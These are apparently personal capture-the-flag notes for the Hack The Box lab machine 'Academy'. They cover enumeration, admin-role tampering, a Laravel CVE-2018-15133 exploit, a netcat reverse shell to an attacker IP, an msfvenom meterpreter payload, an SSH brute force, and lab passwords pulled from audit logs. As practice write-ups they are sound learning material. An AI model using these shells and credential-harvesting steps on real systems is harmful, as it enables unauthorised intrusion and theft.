---
tags:
  - Linux
  - HTB
  - Retired
creation date: 2024-08-17
IP: 10.129.99.197
URL: https://app.hackthebox.com/machines/Academy
Domain: academy.htb
CVEs: CVE-2018-15133
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T5 $IP  
```

```
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://academy.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx?

```

### ffuf (Directories/Subdomain/Files)

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt:FUZZ -u $URL/FUZZ
```

![[Pasted image 20240817090700.png]]
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt:FUZZ -u $URL/FUZZ
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.academy.htb"
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://academy.htb/config.php?FUZZ=key -fs 0
```

### Nikto (Identify Technology)

```session
nikto -h $URL
```

led me astray...
![[Pasted image 20240817104506.png]]

**What we know so far**

Website running HTB Academy

admin.php, login.php (created a user account hacker:hacked)
![[Pasted image 20240817092214.png]]
Username: egre55
![[Pasted image 20240817101717.png]]
### SQLMAP
nothing...

### BurpSuite
Intercept registration and modify roleid
![[Pasted image 20240817104402.png]]

can now login with those creds on the admin.php

admin.php:
![[Pasted image 20240817104424.png]]
Users so far:
cry0l1t3
mrb3n
egre55

eww
![[Pasted image 20240817104822.png]]

### MySQL

![[Pasted image 20240817104907.png]]

![[Pasted image 20240817105044.png]]


## Foothold

Clues: 
![[Pasted image 20240817112123.png]]![[Pasted image 20240817112141.png]]
I googled so much but finally hit the right combo "laravel api exploit"

PoC: https://github.com/aljavier/exploit_laravel_cve-2018-15133

```session
python3 ./pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive
```

![[Pasted image 20240817112417.png]]

#### Enumeration
![[Pasted image 20240817113053.png]]

Get a better shell 🐚
```session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.64 31337 >/tmp/f
```

then an even better 🐚🐚
```session
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.64 LPORT=1337 -f ELF > shell
```

### LinPeas

![[Pasted image 20240817120233.png]]![[Pasted image 20240817120323.png]]

tried getting in to dbs with the new creds... nothing. Time to run hydra and get SSH as a new user

## Lateral Movement

```
hydra -L user -P pass 10.129.99.197 ssh
```

![[Pasted image 20240817123313.png]]

![[Pasted image 20240817120954.png]]

cry0l1t3:mySup3rP4s5w0rd!!
### LinPeas 
![[Pasted image 20240817122042.png]]

mrb3n:mrb3n_Ac@d3my!

Checking for TTY (sudo/su) passwords in audit logs

#TakeAways
adm means you have access to view logs
how to search through logs

```session
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

## Lateral Movement

![[Pasted image 20240817122819.png]]

![[Pasted image 20240817122848.png]]
sticky bit... time for GTFObins!

![[Pasted image 20240817122957.png]]

